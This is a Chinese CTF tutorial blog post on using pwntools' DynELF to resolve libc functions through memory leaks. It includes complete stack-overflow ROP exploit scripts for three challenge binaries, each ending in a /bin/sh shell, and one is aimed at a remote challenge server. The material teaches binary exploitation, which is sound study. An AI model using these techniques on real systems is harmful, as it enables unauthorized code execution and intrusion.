<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>利用DynElf模块完成获取libc信息 | Welcome to Chumen77&#39;s Blog | Struggle 就完事了 !</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content>
    <meta name="description" content="利用DynElf模块完成获取libc信息前言记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。 Dynelf解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都">
<meta property="og:type" content="article">
<meta property="og:title" content="利用DynElf模块完成获取libc信息">
<meta property="og:url" content="http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/index.html">
<meta property="og:site_name" content="Welcome to Chumen77&#39;s Blog">
<meta property="og:description" content="利用DynElf模块完成获取libc信息前言记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。 Dynelf解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/images/15817628590359.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/images/15817631112375.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/images/15817633402017.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/images/15817716059093.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/images/15817725422726.jpg">
<meta property="og:updated_time" content="2020-02-18T00:50:48.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="利用DynElf模块完成获取libc信息">
<meta name="twitter:description" content="利用DynElf模块完成获取libc信息前言记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。 Dynelf解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都">
<meta name="twitter:image" content="http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/images/15817628590359.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="Welcome to Chumen77&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

</head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">chumen77</h5>
          <a href="mailto:973059980@qq.com" title="973059980@qq.com" class="mail">973059980@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/chumen77" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="http://www.weibo.com/" target="_blank" >
                <i class="icon icon-lg icon-weibo"></i>
                Weibo
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">利用DynElf模块完成获取libc信息</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">利用DynElf模块完成获取libc信息</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-02-15T08:54:53.000Z" itemprop="datePublished" class="page-time">
  2020-02-15
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用DynElf模块完成获取libc信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">利用DynElf模块完成获取libc信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Dynelf"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Dynelf</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基本使用框架："><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">基本使用框架：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用条件："><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">使用条件：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用write函数来泄露"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">使用write函数来泄露</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#万能gadget"><span class="post-toc-number">1.2.3.1.</span> <span class="post-toc-text">万能gadget</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PlaidCTF-2013-ropasaurusrex"><span class="post-toc-number">1.2.3.2.</span> <span class="post-toc-text">PlaidCTF 2013 ropasaurusrex</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#查保护和arch"><span class="post-toc-number">1.2.3.2.1.</span> <span class="post-toc-text">查保护和arch</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#ida分析"><span class="post-toc-number">1.2.3.2.2.</span> <span class="post-toc-text">ida分析</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#exp"><span class="post-toc-number">1.2.3.2.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Jarvis-oj-leave4"><span class="post-toc-number">1.2.3.3.</span> <span class="post-toc-text">Jarvis_oj_leave4</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#查保护和arch-1"><span class="post-toc-number">1.2.3.3.1.</span> <span class="post-toc-text">查保护和arch</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#ida分析-1"><span class="post-toc-number">1.2.3.3.2.</span> <span class="post-toc-text">ida分析</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">1.2.3.3.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用puts函数来泄露"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">使用puts函数来泄露</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#针对缺点的改进办法"><span class="post-toc-number">1.2.4.1.</span> <span class="post-toc-text">针对缺点的改进办法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#puts输出完后就没有其他输出"><span class="post-toc-number">1.2.4.1.1.</span> <span class="post-toc-text">puts输出完后就没有其他输出</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#puts输出完后还有其他输出"><span class="post-toc-number">1.2.4.1.2.</span> <span class="post-toc-text">puts输出完后还有其他输出</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Lctf-2016-pwn100"><span class="post-toc-number">1.2.4.2.</span> <span class="post-toc-text">Lctf_2016_pwn100</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#查保护和arch-2"><span class="post-toc-number">1.2.4.2.1.</span> <span class="post-toc-text">查保护和arch</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#ida分析-2"><span class="post-toc-number">1.2.4.2.2.</span> <span class="post-toc-text">ida分析</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#exp-2"><span class="post-toc-number">1.2.4.2.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#其他获取libc的方法"><span class="post-toc-number">1.2.5.</span> <span class="post-toc-text">其他获取libc的方法</span></a></li></ol></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-利用DynElf模块完成获取libc信息"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">利用DynElf模块完成获取libc信息</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-02-15 16:54:53" datetime="2020-02-15T08:54:53.000Z"  itemprop="datePublished">2020-02-15</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="利用DynElf模块完成获取libc信息"><a href="#利用DynElf模块完成获取libc信息" class="headerlink" title="利用DynElf模块完成获取libc信息"></a>利用DynElf模块完成获取libc信息</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。</p>
<h2 id="Dynelf"><a href="#Dynelf" class="headerlink" title="Dynelf"></a>Dynelf</h2><p>解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释）</p>
<h3 id="基本使用框架："><a href="#基本使用框架：" class="headerlink" title="基本使用框架："></a>基本使用框架：</h3><pre><code>io = remote(ip, port)
def leak(addr):
    payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot;
    io.send(payload)
    data = io.recv()
    #debug用的
    print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;)))
    return data
#初始化DynELF模块 
d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)
system_addr = d.lookup(“system”, &apos;libc&apos;)</code></pre><p>其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。<strong>正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols</strong>。</p>
<p>且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。</p>
<h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p>
<ul>
<li>目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</li>
<li>目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</li>
</ul>
<p>以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p>
<h3 id="使用write函数来泄露"><a href="#使用write函数来泄露" class="headerlink" title="使用write函数来泄露"></a>使用write函数来泄露</h3><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p>
<p>其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。</p>
<h4 id="万能gadget"><a href="#万能gadget" class="headerlink" title="万能gadget"></a>万能gadget</h4><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817628590359.jpg" alt="-w817"><br>这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的<code>pop rbx</code>的地址，然后看下栈如何来布置：<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817631112375.jpg" alt="-w486"><br>（其中为什么填入got地址，是因为接下来ret到<code>mov rdx,r13</code>后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）<br>在第一段pop 后ret地址要填入<code>mov rdx,r13</code>的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817633402017.jpg" alt="-w259"><br>所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。</p>
<h4 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013 ropasaurusrex"></a>PlaidCTF 2013 ropasaurusrex</h4><h5 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>Arch:     i386-32-little
 RELRO:    No RELRO
 Stack:    No canary found
 NX:       NX enabled
 PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>ssize_t sub_80483F4()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &amp;buf, 0x100u);
}</code></pre><p>函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *
io = process(&apos;./ropasaurusrex&apos;)
elf = ELF(&apos;./ropasaurusrex&apos;)
buf = 0x8049620
padding = 140
write_add = elf.symbols[&apos;write&apos;]
start_addr = 0x08048340

def leak(addr):
    p = &apos;&apos;
    p += padding * &apos;a&apos;
    p += p32(write_add)
    p += p32(start_addr)
    p += p32(1)
    p += p32(addr)
    p += p32(0x4)
    io.sendline(p)
    content = io.recv(4)
    # print(&quot;%x -&gt; %s&quot; %(addr, (content or &apos;&apos;).encode(&apos;hex&apos;)))
    return content

d = DynELF(leak,elf=elf)
system_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)
read_add = d.lookup(&apos;read&apos;,&apos;libc&apos;)
log.info(&quot;system_add = %x&quot;, system_add)
log.info(&quot;read_add = %x&quot;, read_add)
p = padding * &apos;a&apos; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8)
io.sendline(p)
io.sendline(&apos;/bin/sh\x00&apos;)
io.interactive()</code></pre><h4 id="Jarvis-oj-leave4"><a href="#Jarvis-oj-leave4" class="headerlink" title="Jarvis_oj_leave4"></a>Jarvis_oj_leave4</h4><h5 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &apos;/media/psf/mypwn2/jarvis_OJ/level4/level4&apos;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817716059093.jpg" alt="-w420"></p>
<pre><code>ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  return read(0, &amp;buf, 0x100u);
}</code></pre><p>漏洞函数，存在栈溢出。还是跟上题一样的思路。</p>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *
import time
# context.log_level = &apos;debug&apos;
context.arch = &apos;i386&apos;
# io = process(&apos;./level4&apos;)
io = remote(&apos;pwn2.jarvisoj.com&apos;,9880)
elf = ELF(&apos;./level4&apos;)
__libc_start_main_got = elf.got[&apos;__libc_start_main&apos;]
write_plt = elf.symbols[&apos;write&apos;]
start_addr = 0x08048350
padding = 140

def leak(addr):
    payload = padding * &apos;a&apos; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4)
    io.sendline(payload)
    data = io.recv(4)
    print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;)))

    return data
d = DynELF(leak,elf = elf)
system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
info(&apos;system_addr = %#x&apos; %system_addr)
read_addr = d.lookup(&apos;read&apos;,&apos;libc&apos;)
info(&apos;read_addr = %#x&apos; %read_addr)
binsh_add = 0x804A01C
payload = padding * &apos;a&apos; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8)
io.sendline(payload)
sleep(0.1)
io.sendline(&apos;/bin/sh\x00&apos;)
io.interactive()</code></pre><h3 id="使用puts函数来泄露"><a href="#使用puts函数来泄露" class="headerlink" title="使用puts函数来泄露"></a>使用puts函数来泄露</h3><p>printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，<strong>puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点</strong>，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p>
<h4 id="针对缺点的改进办法"><a href="#针对缺点的改进办法" class="headerlink" title="针对缺点的改进办法"></a>针对缺点的改进办法</h4><h5 id="puts输出完后就没有其他输出"><a href="#puts输出完后就没有其他输出" class="headerlink" title="puts输出完后就没有其他输出"></a>puts输出完后就没有其他输出</h5><p>leak函数模板<br>    def leak(address):<br>      count = 0<br>      content = ‘’<br>      payload = xxx<br>      p.send(payload)<br>      print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出<br>      up = “”<br>      while True:<br>        c = p.recv(numb=1, timeout=0.1)<br>        count += 1<br>        if up == ‘\n’ and c == “”:  #接收到的上一个字符为回车符，而当前接收不到新字符，则<br>         content += content[:-1]  +’\x00’            #删除puts函数输出的末尾回车符<br>          break<br>        else:<br>          content += c<br>        up = c<br>      content = content[:4]  #取指定字节数<br>      log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’)))<br>      return content<br>其中<code>c = p.recv(numb=1, timeout=0.1)</code>由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</p>
<h5 id="puts输出完后还有其他输出"><a href="#puts输出完后还有其他输出" class="headerlink" title="puts输出完后还有其他输出"></a>puts输出完后还有其他输出</h5><pre><code>def leak(address):
  count = 0
  content = &quot;&quot;
  payload = xxx
  p.send(payload)
  print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出
  up = &quot;&quot;
  while True:
    c = p.recv(1)
    count += 1
    if up == &apos;\n&apos; and c == &quot;x&quot;:  #一定要找到泄漏信息的字符串特征
      content = content[:-1] + &quot;x00&quot;                  
      break
    else:
      content += c
    up = c
  content = content[:4] 
  log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &apos;&apos;).encode(&apos;hex&apos;)))
  return content</code></pre><h4 id="Lctf-2016-pwn100"><a href="#Lctf-2016-pwn100" class="headerlink" title="Lctf_2016_pwn100"></a>Lctf_2016_pwn100</h4><h5 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &apos;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&apos;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>int sub_40068E()
{
  char v1; // [rsp+0h] [rbp-40h]

  sub_40063D((__int64)&amp;v1, 200);
  return puts(&quot;bye~&quot;);
}

__int64 __fastcall sub_40063D(__int64 a1, signed int a2)
{
  __int64 result; // rax
  signed int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)i;
    if ( i &gt;= a2 )
      break;
    read(0, (void *)(i + a1), 1uLL);
  }
  return result;
}</code></pre><p>主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。</p>
<ol>
<li>因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。</li>
<li>第二次构造rop链的时候，用read函数读<code>system(/bin/sh)</code>到一个确定的地址，还是会到start处。</li>
<li>第三次构造时候，直接进行调用system函数的rop链即可。</li>
</ol>
<p>其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817725422726.jpg" alt="-w820"></p>
<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code>#coding:utf-8
from pwn import *
context.arch = &apos;amd64&apos;
# context.log_level = &apos;info&apos;
io = process(&apos;./pwn100&apos;)
elf = ELF(&apos;./pwn100&apos;)
# libc = elf.libc
padding = 72
puts_plt = elf.plt[&apos;puts&apos;]
read_got = elf.got[&apos;read&apos;]
start_add = 0x000400550
pop_rdi = 0x400763
def leak(addr):
    payload = padding * &apos;a&apos; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)]
    payload = payload.ljust(200,&apos;b&apos;)
    io.send(payload)
    count = 0
    up = &apos;&apos;
    content = &apos;&apos;
    io.recvuntil(&apos;bye~\n&apos;) #一定要在puts前释放完输出
    while True:
        c = io.recv(numb=1, timeout=0.1)
        count += 1
        if up == &apos;\n&apos; and c == &quot;&quot;:  #接收到的上一个字符为回车符，而当前接收不到新字符，则
            content = content[:-1]  +&apos;\x00&apos;             #删除puts函数输出的末尾回车符
            break
            content += c
        else:
            up = c
    content = content[:4]  #取指定字节数
    log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &apos;&apos;).encode(&apos;hex&apos;)))
    return content

d = DynELF(leak, elf = elf)
system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
log.info(&apos;system_addr = %#x&apos; %system_addr)
binsh_addr = 0x601068 - 8

payload = padding * &apos;a&apos; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&apos;\x00&apos;*56,start_add])
payload = payload.ljust(200,&apos;b&apos;)
io.send(payload)
io.recvuntil(&apos;bye~\n&apos;)

io.send(&apos;/bin/sh\x00&apos;)
payload = padding * &apos;a&apos; + flat([pop_rdi,binsh_addr,system_addr])
payload = payload.ljust(200,&apos;b&apos;)
io.send(payload)
io.interactive()</code></pre><h3 id="其他获取libc的方法"><a href="#其他获取libc的方法" class="headerlink" title="其他获取libc的方法"></a>其他获取libc的方法</h3><p>虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：<br><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。</p>
<p>还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。</p>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最終更新：<time datetime="2020-02-18T00:50:48.000Z" itemprop="dateUpdated">2020-02-18 08:50:48</time>
</span><br>


        
        这里可以写作者留言,thank you for your reading.
        
    </div>
    
    <footer>
        <a href="http://chumen77.xyz">
            <img src="/img/avatar.jpg" alt="chumen77">
            chumen77
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            

            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/&title=《利用DynElf模块完成获取libc信息》 — Welcome to Chumen77's Blog&pic=http://chumen77.xyz/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/&title=《利用DynElf模块完成获取libc信息》 — Welcome to Chumen77's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《利用DynElf模块完成获取libc信息》 — Welcome to Chumen77's Blog&url=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/&via=http://chumen77.xyz" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
  

  
    <div class="waves-block waves-effect next">
      <a href="/2020/02/14/linux下clash的使用/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">linux下clash的使用</h4>
      </a>
    </div>
  
</nav>



    




















</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>このブログの内容物は<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>chumen77 &copy; 2019 - 2020</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
